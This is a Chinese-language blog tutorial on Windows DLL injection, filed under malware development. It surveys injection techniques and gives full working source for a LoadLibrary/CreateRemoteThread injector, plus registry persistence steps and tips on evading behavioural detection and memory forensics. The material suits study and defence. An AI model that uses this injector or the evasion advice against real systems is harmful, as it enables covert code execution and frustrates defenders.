title: 那些常見與不常見的DLL注入技術
tags:
  - 惡意程式開發
  - 簡易
excerpt: 這一篇文章將會導覽各種 DLL 注入技術與 LoadLibrary 注入實作方法，還有進行開發時要注意的一些事情
categories: []
date: 2025-06-15 04:03:00
---
# 前言

我把論文寫完了 \OwO/

雖然我寫惡意程式的經驗也算不少，但每次要實作 DLL 注入時，總是習慣以 `CreateRemoteThread + LoadLibrary` 這種經典手法。所以我開始研究還有哪些 DLL 注入技術可以玩，卻發現網路上相關文章大多被付費牆或內容農場所污染 ~~甚至是我自己的文章XD~~。
![](image1.png)

既然這樣，就來把我蒐集到的DLL注入技術彙整於此，之後要用時就可以直接找這邊。這一篇文章將會導覽**各種 DLL 注入技術與 `LoadLibrary` 注入實作方法，還有進行開發時要注意的一些事情**。之後將會建立一個系列，對這篇提到的注入技術進行實作演示。

由於這篇文章可能會被我拿來當之後教案的材料 (沒錯又是鐵人賽)，所以會提供比較多的基礎知識。若你是有經驗或只是想查某些注入技術，可以直接來 [DLL-注入技術摘要](#DLL-注入技術摘要) 。

# DLL 注入技術簡介

## 甚麼是 DLL 注入
https://attack.mitre.org/techniques/T1055/001/

簡單來說，DLL 注入是一種讓你將自訂程式碼「塞進」正在執行的目標行程 (Process) 中的技術。使目標能以其權限執行你想要達成的目標，如存取私有記憶體、攔截或替換 API、乃至於繞過安全機制等等。而做法通常是在目標行程的**記憶體空間中載入一個 DLL 檔案或路徑**，隨後透過各種方式 **呼叫 DLL 中的程式碼地址**，藉此在該行程執行你自己的程式碼。
![](20250610132425.png)

> 等等，甚麼是 DLL?
> 							— 四年前的作者 

由於很多人都沒有 DLL 開發的經驗與需求，即使是大部分資工系也不曾教過，導致讀到相關技術時時常一頭霧水。
**所以這邊以直白的方式講 DLL 到底是甚麼東西，與他要如何開發與運行?** 如果你已經會了，[點我傳送](#DLL-注入技術摘要)。

## DLL 開發

與其一直講理論的東西，我更喜歡在實作中講述他的功能。我們開啟 Visual Studio 2022 > 建立新的專案 > 選用 cpp 的**動態連結程式庫**(注意語言與名稱不要選錯)，並建立 "HelloDLL" 專案。
![](20250609163305.png)

建立完成後，你會看到預設程式碼，寫著 `DllMain()` :
```cpp
// dllmain.cpp : 定義 DLL 應用程式的進入點。
#include "pch.h"

BOOL APIENTRY DllMain( HMODULE hModule,DWORD  ul_reason_for_call,LPVOID lpReserved)
{
    switch (ul_reason_for_call) // 注意這邊
    {
    case DLL_PROCESS_ATTACH:
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
```
當系統呼叫`DllMain`時，會附帶一個 `ul_reason_for_call`參數，而這個參數只會在四種情況出現 :
1. **DLL_PROCESS_ATTACH**：當 DLL **第一次載入到行程** 時被呼叫，並且整個過程**只會執行一次**。
2. **DLL_PROCESS_DETACH**：跟第一條相反。當 **DLL 被行程移除**時呼叫，一樣整個過程**只會執行一次**。
3. **DLL_THREAD_ATTACH** ：當行程建立**新執行緒**時，就會呼叫。由於一個行程會有多個執行緒，因此可能會觸發好幾次。
4. **DLL_THREAD_DETACH** ：跟第三條相反。該**執行緒結束時**，就會呼叫已進行執行緒層級的清理工作。

讓我們嘗試編譯並執行這個 DLL程式，你會發現根本**無法透過雙擊執行**。這是因為 DLL 就像一個食譜，上面寫著各個功能的程式碼與位置，卻沒有自主執行的能力，這時候就需要一名廚師來發動這一本食譜。目前我們的食譜一道菜都沒有，所以先添加一道菜 "SayHello" :
```cpp
extern "C" __declspec(dllexport) void CALLBACK SayHello(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow)
{
    MessageBoxA(hwnd, "Hello, World!\nFrom SayHello!", "HelloWorld", MB_OK | MB_ICONINFORMATION);
}
```
他只會顯示一個寫著 `Hello, World! From SayHello!` 的訊息框，但它上面一堆怪東西是甚麼呢?
- **extern "C"** : 指示編譯器採用 **C linkage** ，函式庫兼容C與cpp(避免[name mangling](https://en.wikipedia.org/wiki/Name_mangling))。
- **declspec(dllexport)** : 此函數要輸出到 DLL，也就是在菜單上添加菜名。
- void : 這函數沒回傳值。
- **CALLBACK** : 呼叫慣例巨集，在 Win32 為 `__stdcall` 與大多數 Win32 API 相容。
- SayHello : 函數名稱。


現在，我們稍微修改原本的程式碼，並進行編譯來觀察DLL的執行過程。
```cpp
extern "C" __declspec(dllexport) void CALLBACK SayHello(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow)
{
    MessageBoxA(hwnd, "Hello, World!\nFrom SayHello!", "HelloWorld", MB_OK | MB_ICONINFORMATION);
}

BOOL APIENTRY DllMain(HMODULE hModule,DWORD ul_reason_for_call,LPVOID lpReserved)
{
    switch (ul_reason_for_call)
	{

    case DLL_PROCESS_ATTACH:
        MessageBoxA(NULL, "HelloWorld DLL Loaded!\n DLL_PROCESS_ATTACH", "HelloWorld", MB_OK | MB_ICONINFORMATION);
        break;

    case DLL_THREAD_ATTACH:
        MessageBoxA(NULL, "HelloWorld DLL Loaded!\n DLL_THREAD_ATTACH", "HelloWorld", MB_OK | MB_ICONINFORMATION);
        break;

    case DLL_THREAD_DETACH:
        MessageBoxA(NULL, "HelloWorld DLL Unloaded!\n DLL_THREAD_DETACH", "HelloWorld", MB_OK | MB_ICONINFORMATION);
        break;

    case DLL_PROCESS_DETACH:
        MessageBoxA(NULL, "HelloWorld DLL Unloaded!\n DLL_PROCESS_DETACH", "HelloWorld", MB_OK | MB_ICONINFORMATION);
        break;

    }
    return TRUE;
}
```
如果你會在虛擬機測試的話，記得先去**屬性>C/cpp>程式碼產生** 將執行階段程式庫改成 "多執行續 (/MT)" 的**靜態連結**方式，避免執行時出現找不到dll的訊息。
![](20250609174423.png)

然後進行建置方案，就可以看到你的第一個DLL了 !

我們可以透過 [PEBear](https://github.com/hasherezade/pe-bear) 來觀察這一個 dll 檔案，就能發現剛剛寫入的 SayHello 已經在導出函數表了。
![](20250609175432.png)

有了食譜，現在需要一位廚師 : rundll32.exe 。他是Windows 系統中的一個核心工具，使用戶在不直接啟動 DLL 的情況下，執行 DLL 內部的特定功能。Rundll32有兩個版本，分別對應至64位元與32位元 :
- `C:\Windows\System32\rundll32.exe` : 64位元
- `C:\Windows\SysWOW64\rundll32.exe` : 32位元

使用方法
```powershell
rundll32.exe DLL名稱,函數名稱 [參數]
```

若要將我們的 dll 執行，僅用以下命令 :
```powershell
C:\Windows\System32\rundll32.exe dllHelloWorld.dll,SayHello
```
![](20250611185232.png)
輸入後可以看到一些視窗，我們觀察它的規律 :
1. 首先可以看到 `DLL_PROCESS_ATTACH` 被觸發
2. 接下來數個 `DLL_THREAD_ATTACH` 出現
3. "SayHello!" 視窗出現 
4. 數個 `DLL_THREAD_DETACH` 出現，數量等於 `DLL_THREAD_ATTACH`。(可能會早於"SayHello!" )
5. 最後 `DLL_PROCESS_DETACH` 出現代表該程式結束

到這邊，我們就大致理解 DLL 的運作原理與實作方法了 !

---
# DLL 注入技術摘要

這邊會講一下目前我找到的 DLL 注入技術的分類與一些特性，而其實作的部分會放在之後的文章中。

- LoadLibrary
- QueueUserAPC
- Reflective DLL Injection
- SetWindowsHookEx
- Thread Context
- Manual Mapping
- AppInit_DLLs
- AppCertDLLs
- DLL Hollowing

當然，還有不少是沒有寫在這邊的注入技術，若之後有研究的也會放進來。
### LoadLibrary
POC : [LoadLibrary 實作](#LoadLibrary-實作)

難度 : ★
隱匿度：★

算是最經典的傳統注入手法，其核心思想是在**目標行程配置記憶體並寫入 DLL 路徑**，再由**遠端執行緒呼叫 LoadLibrary 。

**流程 :**
1. 找到目標 PID。
2. 取得可寫入權限的 HANDLE。
3. 寫入 DLL 路徑字串在目標記憶體。
4. 以 `CreateRemoteThread` 建立遠端執行緒，執行緒入口設定為 `LoadLibraryA/W`，引數即 DLL 路徑字串位置。

優點是簡單、相容性高；缺點則是所有 API 呼叫都可被 EDR 攔截，且 DLL 必須落地硬碟，產生 IOC。
### QueueUserAPC
難度 : ★★
隱匿度：★★★

APC（Asynchronous Procedure Call,異步過程調用）允許將回呼函式(Callback) 排入某個特定執行緒的 APC 佇列，該執行緒可在進入**警醒狀態（Alertable state）** 時執行其中被排入佇列的 Callback。典型手法是將 **LoadLibrary** 函數地址與惡意DLL路徑作為參數排到目標執行緒的APC佇列，誘使其在適當時機載入DLL。

**流程 :**
1. 找到目標執行緒 TID ( 可用 Thread32First/Thread32Next )，`OpenThread` 取得 HANDLE。
2. 使用 `QueueUserAPC` 將 APC 請求插入該執行緒的隊列中，可以指定參數為惡意DLL路徑或是自定義shellcode函數地址。
3. 當執行緒之後呼叫 `SleepEx`, `WaitForSingleObjectEx`（alertable 版本）等 API 時，就會執行排隊的 APC。

如果無法確定執行緒何時警醒，有幾個常見辦法 :
- 第一步時就找已在 `Alertable` 的 Thread 
- 強制使目標執行緒進入等待狀態
- 創建一個暫停的新執行緒僅為執行APC（ Early Bird ）。

由於不需要創建新執行緒較為隱匿，且可以指定任意執行緒執行注入任務，對同步和執行緒控制有一定優勢。
但若目標執行緒從不進入 alertable wait，注入永遠不會觸發。常見改進包括自行發送 `NtTestAlert` 或強制呼叫 alertable wait，以提高命中率。
### Reflective DLL Injection
難度 : ★★★
隱匿度：★★★

注入端只需將整個 DLL blob 寫入目標記憶體，並啟動執行緒指向 `ReflectiveLoader`。整個過程不落磁碟，也不向 PEB 的 Module List 註冊，因此可以逃過基於文件或模組列表的偵測。

**流程 :**
1. 將整顆反射式 DLL blob 以 `WriteProcessMemory`寫入目標記憶體。
2. `CreateRemoteThread`（或 hijack thread）把 RIP 指到 `ReflectiveLoader`。
3.  Loader 解析本身結構 → `VirtualAlloc` 申請連續區段 → 重定位、匯入解析 → 跳進 `DllMain`。

缺點是需自行維護支援各種架構如 x86、x64、不同 Windows 版本及 TLS、SEH 等自製 Loader，開發成本極高。
### SetWindowsHookEx
難度 : ★
隱匿度：★★

利用 Windows 提供的訊息掛鉤機制，開發者撰寫含 **HookProc** 的 DLL，呼叫 `SetWindowsHookEx`（如 `WH_GETMESSAGE`, `WH_KEYBOARD_LL`）後，系統會自動把 DLL 注入指定執行緒/行程。

**流程 :**
1. 編寫導出 `HookProc` 的 DLL。
2. 以 `SetWindowsHookEx(WH_GETMESSAGE, … , hMod, tid)` 對目標執行緒安裝。
3. 系統自動將 DLL 映射進該執行緒所屬行程。

因屬常見 API，在惡意程式掃描時的風險分數較低；不過它只對含 GUI 且有訊息迴圈的行程成立，像是對服務或 console app 無效。
### AppInit_DLLs
難度 : ★
隱匿度：★

Windows 為了方便系統層延伸而提供的[機制](https://learn.microsoft.com/zh-tw/windows/win32/dlls/secure-boot-and-appinit-dlls) 。載入 **user32.dll** （幾乎所有 GUI 應用）都會讀取該機**註冊表**指定的 DLL。不過從 Windows 7 開始需手動設 `LoadAppInit_DLLs=1`( 預設為 0 )，且用 `RequireSignedAppInit_DLLs=1` 強制驗證簽章。

**流程 :**
1. 修改 `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows\AppInit_DLLs`，寫入 DLL 路徑。
2. 設 `LoadAppInit_DLLs`＝1（必要時 `RequireSignedAppInit_DLLs`＝0）。
3. 每次程序載入 user32.dll 時，Windows Loader 自動呼叫 `LoadLibrary` 載入列舉 DLL。

優點是一次設定即可**全系統注入**，並在**重開機後持續生效**；缺點是特徵極明顯，也最容易被發現。
### AppCertDLLs
難度 : ★★
隱匿度：★★

跟上面那個很像，此機制位於 **Session Manager** 階段，任何呼叫 `CreateProcess`、`WinExec` 的程式都會先載入該機**註冊表**指定的 DLL。

**流程 :**
1. 修改 `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\AppCertDLLs`，寫入 DLL 路徑。
2. 任何程式呼叫 CreateProcess() 時，Windows 將先載入指定 DLL，再繼續行程建立流程。

它比 AppInit_DLLs 準確，僅針對要產生子行程的流程，常見於防毒動態攔截或家長監控軟體。缺點類似 AppInit_DLLs：需寫系統註冊碼並在現代 Windows 時會受簽章限制；且 GUI-only 應用內部不呼叫 CreateProcess 時不會觸發。
### DLL Hollowing
難度 : ★★★★
隱匿度：★★★★

攻擊者將**合法的 DLL** 載入行程的記憶體空間，然後用惡意程式碼**覆寫 DLL** 的部分區段。

**流程 :**
1. `LoadLibrary` 合法 DLL（如 kernel32.dll 副本，可以是未使用或犧牲用）。
2. 以 `VirtualProtect` 或直接修改可寫區段，把原 `.text` 覆寫為惡意 shellcode；或刪除 PE header 並填入新映像。
3. 覆寫 `AddressOfEntryPoint` 或導出函式指標，導向自有程式碼。

因它並非簡單地向程序中新增一個惡意 DLL，而是劫持並重新利用已經載入的合法 DLL，所以可以在看似正常且受信任的函式庫中隱藏惡意活動，具有極高的隱匿性。
### Thread Context
難度 : ★★★★
隱匿度：★★★★

由於創建新執行緒很明顯又容易被偵測，所以該方法**暫停現有執行緒**並修改 EIP 指向惡意程式碼，

**流程 :**
1. 開啟目標程序，再用 `OpenThread` 取得其中一條現有執行緒的控制權。
2. 在目標程序分配可執行記憶體，然後用寫入 shellcode 或一個小型 stub（這個 stub 會呼叫 `LoadLibraryA` 並傳入 DLL 路徑）。
3. 暫停這條被選中的執行緒，取得該執行緒的暫存器狀態。
4. ㄐ將該暫存器的 EIP 指向 shellcode 或 stub 位置。
5. 用 `SetThreadContext(threadHijacked, &ctx)` 寫回修改後的 Thread Context。
6. 恢復執行，開始執行你注入的程式碼並載入 DLL，最後再跳回原本的指令指標繼續執行。

雖然僅是執行緒短暫暫停，極難與注入行為做關聯而觸發規則；但需要需處理堆疊、同步與架構差異，實作門檻高。
### Manual Mapping
難度 : ★★★★
隱匿度：★★★★

既然 Windows 提供的 `LoadLibrary` 和 `CreateRemoteThread` 都是各個防毒軟體的重點關注 API ，本方法**手工**將DLL的內容載入目標行程記憶體中，並自行完成需要的修復工作（例如重配置匯入表和重定位），而**不透過** Windows API。

**流程 :**
1. 計算欲注入PE/DLL檔大小，在目標配置足夠記憶體空間
2. 透過 `WriteProcessMemory` 將完整的DLL檔原始數據寫入這塊記憶體中
3. 由注入程序在目標行程內設計**自行執行映射流程**(計算新的基址偏移、重定位表修正至 DLL 的絕對地址、規劃 IAT 函數位置等等......)

有點類似於之前在鐵人賽寫的內嵌補丁[這一篇](https://ithelp.ithome.com.tw/articles/10301353)。(示意圖)
![](20250615024505.png)

這種方法本質上屬於將可執行PE檔案直接寫入目標進程並啟動執行，又稱 **PE 注入 (PE Injection)**。與經典方法相比，手動映射**不需要將惡意DLL存放到磁碟**，因此隱蔽性更高，但也非常麻煩。

# 注入技術實作

在理解這些注入技術的特性之後，我們來嘗試實作看看這些方法。在開始之前，先提供一些有用的函數使我們開發方便一點。

isUserAdmin : 這個函數來自於[MDMZ_Book](https://github.com/cocomelonc/mdmz_book)，用於測試是否具有系統管理員權限。
```cpp
bool isUserAdmin() {	// from MDMZ_Book.pdf
	bool isElevated = false;
	HANDLE token;
	TOKEN_ELEVATION elev;
	DWORD size;
	if (OpenProcessToken(GetCurrentProcess(),
		TOKEN_QUERY, &token)) {
		if (GetTokenInformation(token, TokenElevation,
			&elev, sizeof(elev), &size)) {
			isElevated = elev.TokenIsElevated;
		}
	}
	if (token) {
		CloseHandle(token);
		token = NULL;
	}
	return isElevated;
}
```
---
getDLLPath : 用於取得目前 dll 檔案位置。
```cpp
bool getDLLPath(wchar_t* DLLPath) {
	HMODULE hModule = NULL;
	if (GetModuleHandleEx(GET_MODULE_HANDLE_EX_FLAG_FROM_ADDRESS, (LPCTSTR)&getDLLPath, &hModule))
	{
		if (GetModuleFileName(hModule, DLLPath, MAX_PATH) > 0)
		{
			return true;
		}
	}
	return false;
}
```
## LoadLibrary 實作
### 方法說明

上面提到，這種注入方法的核心思想是在目標行程配置記憶體並**寫入 DLL 路徑**，再由**遠端執行緒呼叫 LoadLibrary 載入**。所以我們需要以下步驟來達成目標 :
1.  取得目標 PID。
2. `OpenProcess` 取得可寫入權限的 HANDLE。
3. 以 `VirtualAllocEx` 在目標記憶體中配置空間，並以 `WriteProcessMemory` 寫入 DLL 路徑字串。
4. 以 `CreateRemoteThread` 建立遠端執行緒，執行緒入口設定為 `LoadLibraryA/W`，引數即前述字串位址。

以下將省去異常處理，先用程式碼了解流程( 等等會有實做 ) : 

首先，注入器必須使用 OpenProcess API 並具備適當的存取權限（包括 PROCESS_ALL_ACCESS 權限）來**取得目標程序的句柄**。此句柄使注入器能與目標程序互動，包括記憶體配置、寫入及執行緒建立。
```cpp
bool DLLinject(DWORD pid, const wchar_t* dllPath) {
	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
```
接下來為了使 LoadLibrary 函數以 dll 文件位置作為引數，故需要將 dll 文件位置先**寫入目標記憶體**。
```cpp
	// 在目標記憶體中配置空間，大小為 [dllPath + 1]
	LPVOID pDllPath = VirtualAllocEx(hProcess, NULL, (wcslen(dllPath) + 1) * sizeof(wchar_t), MEM_COMMIT, PAGE_READWRITE);

	// 以 WriteProcessMemory 寫入 DLL 路徑字串
	SIZE_T bytesWritten;
	WriteProcessMemory(hProcess, pDllPath, dllPath, (wcslen(dllPath) + 1) * sizeof(wchar_t), &bytesWritten)
```
由於我們使用 LoadLibrary 位於 Kernel32.dll 中，所以尋找目標程序中 LoadLibrary 函數的**位址**。
```cpp
	// 取用 Kernel32.dll
	HMODULE hKernel32 = GetModuleHandleW(L"Kernel32.dll");
	// 取得 Kernel32.dll!LoadLibraryW 函數位置
	LPTHREAD_START_ROUTINE pLoadLibraryW = reinterpret_cast<LPTHREAD_START_ROUTINE>(GetProcAddress(hKernel32, "LoadLibraryW"));
```
最終利用 CreateRemoteThread 在目標程序中**建立一個新執行緒**，該執行緒以 DLL 路徑作為參數執行 LoadLibrary 函數。 CreateRemoteThread 函數將 LoadLibrary 的位址作為執行緒啟動例程，並將包含 DLL 路徑的已分配記憶體作為參數。 這迫使目標程序載入並執行惡意 DLL，完成注入過程。
```cpp
	HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, pLoadLibraryW, pDllPath, 0, NULL);
```
最後等待執行緒結束並釋放資源。
```cpp
	WaitForSingleObject(hThread, INFINITE);

	VirtualFreeEx(hProcess, pDllPath, 0, MEM_RELEASE);
	CloseHandle(hThread);
	CloseHandle(hProcess);

	return true;
}

```

---
### DEMO
理解了該注入方法的流程後，我們來設計一個可以對目標 PID 進行注入的 DLL :
1. 現在我們在`DLL_PROCESS_ATTACH`加上使 DLL 被呼叫時**輸出他所在程序名稱**的功能。
2. 添加 `StartInjection` 函數，可以利用 rundll32 **指定參數**來注入目標 PID。
3. 記得要使用**管理員權限**來進行注入。

pch.h
```cpp
#ifndef PCH_H
#define PCH_H

#include "framework.h"
#include <windows.h>
#include "string"
#include <psapi.h>

#endif //PCH_H
```
main.cpp
```cpp
#include "pch.h"

// 取得 DLL 檔案路徑
bool getDLLPath(wchar_t* DLLPath) {
	HMODULE hModule = NULL;
	if (GetModuleHandleEx(GET_MODULE_HANDLE_EX_FLAG_FROM_ADDRESS, (LPCTSTR)&getDLLPath, &hModule))
	{
		if (GetModuleFileName(hModule, DLLPath, MAX_PATH) > 0)
		{
			return true;
		}
	}
	return false;
}

// DLL 注入函數
bool DLLinject(DWORD pid, const wchar_t* dllPath) {
	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
	if (hProcess == NULL)
	{
		return false;
	}

	LPVOID pDllPath = VirtualAllocEx(hProcess, NULL, (wcslen(dllPath) + 1) * sizeof(wchar_t), MEM_COMMIT, PAGE_READWRITE);
	if (pDllPath == NULL)
	{
		CloseHandle(hProcess);
		return false;
	}

	SIZE_T bytesWritten;
	if (!WriteProcessMemory(hProcess, pDllPath, dllPath, (wcslen(dllPath) + 1) * sizeof(wchar_t), &bytesWritten))
	{
		VirtualFreeEx(hProcess, pDllPath, 0, MEM_RELEASE);
		CloseHandle(hProcess);
		return false;
	}

	HMODULE hKernel32 = GetModuleHandleW(L"Kernel32.dll");
	if (hKernel32 == NULL)
	{
		VirtualFreeEx(hProcess, pDllPath, 0, MEM_RELEASE);
		CloseHandle(hProcess);
		return false;
	}

	LPTHREAD_START_ROUTINE pLoadLibraryW = reinterpret_cast<LPTHREAD_START_ROUTINE>(GetProcAddress(hKernel32, "LoadLibraryW"));
	if (pLoadLibraryW == NULL)
	{
		VirtualFreeEx(hProcess, pDllPath, 0, MEM_RELEASE);
		CloseHandle(hProcess);
		return false;
	}

	HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, pLoadLibraryW, pDllPath, 0, NULL);
	if (hThread == NULL)
	{
		VirtualFreeEx(hProcess, pDllPath, 0, MEM_RELEASE);
		CloseHandle(hProcess);
		return false;
	}

	WaitForSingleObject(hThread, INFINITE);

	VirtualFreeEx(hProcess, pDllPath, 0, MEM_RELEASE);
	CloseHandle(hThread);
	CloseHandle(hProcess);

	return true;
}

// 呼叫函數
extern "C" __declspec(dllexport) void CALLBACK StartInjection(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow)
{
	int targetPID = 0;
	if (lpszCmdLine && *lpszCmdLine) {
		targetPID = std::atoi(lpszCmdLine);
	}

	wchar_t dllPath[MAX_PATH];

	if (!getDLLPath(dllPath)) {
		MessageBoxA(0, "GetDLLPath Fail", "LoadLibraryInject", 0);
		exit(-1);
	}

	if (targetPID == 0) {
		MessageBoxA(0, "rundll32.exe <DLLFILE>,StartInjection <PID>", "LoadLibraryInject", 0);
		exit(-1);
	}

	DLLinject(targetPID, dllPath);

	ExitProcess(0);
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved)
{
	HANDLE hProcess = GetCurrentProcess();
	wchar_t processName[MAX_PATH] = L"<unknown>";

	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
		if (GetModuleBaseNameW(hProcess, NULL, processName, MAX_PATH))
		{
			std::wstring msg = L"DLL is run at :\n";
			msg += processName;
			MessageBoxW(0, msg.c_str(), L"LoadLibraryInject", 0);
		}
		break;
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
	case DLL_PROCESS_DETACH:
		break;
	}
	return TRUE;
}
```

編譯完成之後，將 dll 放入虛擬機中。然後找一個用來注入的目標，這邊選擇了 `notepad++.exe` 來作為對象，使用 [Sysinternals Suite](https://learn.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite) 的`process explorer`  來檢視該行程的 PID 與目前引入的 DLL 清單 :
![](20250611195208.png)

看見目標PID是1452，執行命令 :
```cmd
rundll32 LoadLibraryInject.dll, StartInjection 1452
```

首先你會看到視窗顯示的名稱是 `rundll32.exe` 代表成功在 rundll32 上運行。接下來 `notepad++.exe` 會彈出視窗，代表我們成功進行 DLL注入了 !

{% note warning %}
進行注入極可能導致目標程式沒有回應，尤其是 DllMain 中使用 MessageBox 導致的 Loader Lock。
故盡量不要與被注入的程式互動 ( 注意事項章節將說明解決方案 )
{% endnote %}

成功注入後，使用 `process explorer` 中可以看到現在 `notepad++.exe` 已經引入 `LoadLibraryInject.dll`。

![](20250611200142.png)
## DLL注入注意事項

如果剛剛在注入後對 Notepad++ 進行操作，就會發現程式**無回應**並且重新啟動了。因此在進行DLL注入時，需要特別注意架構兼容性、DllMain函數限制、行程權限管理、記憶體分配策略以及安全檢測規避等多個問題，以確保注入過程的穩定性和成功率。並且這些問題**不僅限於 LoadLibrary 注入手法**，以下會說明常見的一些情況。
### DllMain函數的限制

由於DLL被加載到進程後會自動運行 `DllMain()` 函數，因此我們會想把很多想執行的代碼放到 `DllMain()` 函數中。然而，Windows 透過一把 Loader Lock 來保護模組載入/解除載入期間的內部結構（PE 映像、導入表、TLS 等等）。任何在 Loader Lock 持有期間又嘗試載入其他 DLL、開新執行緒、等候物件、做 COM 初始化……都可能導致死結發生而崩潰。就像剛剛 Notepad++ 崩潰就是因為使用了 MessageBox 導致死鎖。

常見的情況像是這樣 :
```cpp
HANDLE hThread = CreateThread(..., WorkerProc, ...); 
WaitForSingleObject(hThread, INFINITE); // 立即觸發死鎖CloseHandle(hThread);
CloseHandle(hThread);
```

而微軟有詳細說明你不該在 `DllMain()` 做的事 : 
https://learn.microsoft.com/zh-tw/windows/win32/dlls/dynamic-link-library-best-practices

---
那我們該甚麼做呢? 其實只要在 `DllMain()` 中避免使用會導致**模組加載**或**資源爭用** 的函數就可以了。

> 啊我就是需要這些功能阿
> 							— 作者 

當然不能能說不用就不用，正確的方式是將 `DllMain()` 設計為**非阻塞式**，而會造成阻塞的功能則透過 **thread-pool** 避開 Loader-Lock。
```cpp
static void CALLBACK ShowHostProcess(PTP_CALLBACK_INSTANCE, PVOID, PTP_WORK) {
	wchar_t name[MAX_PATH] = L"<unknown>";
	if (GetModuleBaseNameW(GetCurrentProcess(), nullptr, name, MAX_PATH)) {
		std::wstring msg = L"DLL is run at :\n";
		msg += name;
		MessageBoxW(nullptr, msg.c_str(), L"SafeLoadLibraryInject", MB_OK);
	}
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved)
{
	switch (ul_reason_for_call)
	{
		case DLL_PROCESS_ATTACH:

		DisableThreadLibraryCalls(hModule);  // 避免多餘回調
		// 把 UI 相關動作排到 Loader-Lock 之外
		if (PTP_WORK w = CreateThreadpoolWork(ShowHostProcess, nullptr, nullptr)) {
			SubmitThreadpoolWork(w);
		}
	}
	return TRUE;
}
```

這時候再次對 `notepad++.exe` 進行注入，就可以使訊息窗與者程式同時順暢運行。
![](20250612011511.png)
### 32與64位元兼容性問題

在進行DLL注入時，最關鍵的限制之一是架構兼容性問題。由於Windows系統的記憶體地址空間管理機制，不同架構的行程無法共享相同的記憶體空間結構。因此 **32位不能注入64位**、**64位也不能注入32位**，需確保注入器與目標行程的架構完全一致。

相同的，若是利用到註冊表來進行注入的方式，也需要注意到兼容性問題。比如 `App_Init_DLLs` 有兩個不同的註冊表路徑 :
- HKEY_LOCAL_MACHINE\SOFTWARE\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Windows\AppInit_DLLs
- HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows\AppInit_DLLs

因此，在設計注入工具時，應該首先檢測目標進程的架構類型，然後選擇相應的DLL版本進行注入與設定。
### 權限與記憶體管理

針對目標注入時，通常需要獲得足夠的訪問權限。比如說若我們需要 LoadLibrary 注入，則通過`OpenProcess` 函數獲取目標行程句柄時，通常使用`PROCESS_ALL_ACCESS`權限標誌，不過這樣會大幅提高被行為式偵測標記的機率(畢竟惡意程式最愛偷懶這樣寫）。
```cpp
HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
```

因為 `LoadLibraryW` + `CreateRemoteThread` 實際上僅使用了以下4個 FLAG，依最小權限組合我們可以僅使用這些旗標即可。

| 權限旗標                                | 十六進位值    | 為什麼需要                                                                                         |
| ----------------------------------- | -------- | --------------------------------------------------------------------------------------------- |
| `PROCESS_CREATE_THREAD`             | `0x0002` | 在目標行程內開一條 Remote Thread 來呼叫 `LoadLibraryW`。                                                   |
| `PROCESS_VM_OPERATION`              | `0x0008` | 在目標行程配置或解除記憶體（`VirtualAllocEx` / `VirtualFreeEx`）。                                            |
| `PROCESS_VM_WRITE`                  | `0x0020` | 把字串「DLL 路徑」寫進剛配置好的記憶體區段。                                                                      |
| `PROCESS_QUERY_LIMITED_INFORMATION` | `0x1000` | 取得行程基本資訊，用來確認位元數 (x86/x64)、Integrity Level 等；必要時也可配合 `GetModuleHandleEx` 找 `kernel32.dll` 基址。 |

```cpp
HANDLE hProcess = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_WRITE| PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
```
這時我們在對 notepad.exe 進行注入，也是可以成功的注入。並且可以避免 Protected Process Light (PPL) 或一些核心服務因為超出需求範圍的權限請求視為「過度操作」而回傳 `ERROR_ACCESS_DENIED`導致注入失敗。

### 字元編碼與API選擇

這一點我認為是挺常遇到的，當我們使用 Windows API 時會看到三種類型，以 MessageBox 舉例，會發現有三種函數可以呼叫:
- MessageBox
- MessageBoxA
- MessageBoxW

大部分的人會直接使用 `MessageBox` 進行呼叫，不過觀察以下程式碼可以發現 `MessageBox` 是泛型巨集（macro），編譯時依定義 **自動對應到 A (ANSI) 或  W (Unicode) 版本**。
WinUser.h:9227
```cpp
#ifdef UNICODE
#define MessageBox  MessageBoxW
#else
#define MessageBox  MessageBoxA
#endif // !UNICODE
```

那我們又該如何選擇要使用 W 還是 A 呢? 以我個人的建議 : **一律選擇 W ，且別再用 ANSI 版本**了。

這麼說似乎有點太果斷，不過任何以 `A` 結尾的 WINAPI 函式，例如 `ShellExecuteExA`、`CreateFileA` 等，它們都是先呼叫 `MultiByteToWideChar`（或其他變形）把 UTF-8 編碼轉成 UTF-16 編碼，然後再呼叫對應的寬字元版本。此外，若使用 ANSI 將會導致在非英語系相容性出問題，導致亂碼或截斷。 
### 不優的優化

MSVC 編譯器有時會會根據你的程式內容來做一些優化，不過這些優化可能會導致你的實作失效。特別是關於記憶體操作的部分，以 myZeroMemory 為例，它的功用是將記憶體中殘留的資訊清空 :
```cpp
for(i=0; i<sz; ++i) p[i]=0;
```
當 MSVC 編譯時，可能會**自動被優化**為 `memset(p,0,sz)`，而學過程式碼安全的可能會知道 : 當編譯器檢測到某個記憶體緩衝區在**被清零後不再使用時**，可能會將memset或ZeroMemory的呼叫視為 **"死碼"** 而**移除**。導致在記憶體鑑識時可以找到惡意程式留下的痕跡。

P.S. 建議使用 SecureZeroMemory 函數來抹除記憶體。(不是ZeroMemory，ZeroMemory = memset)
# 後記

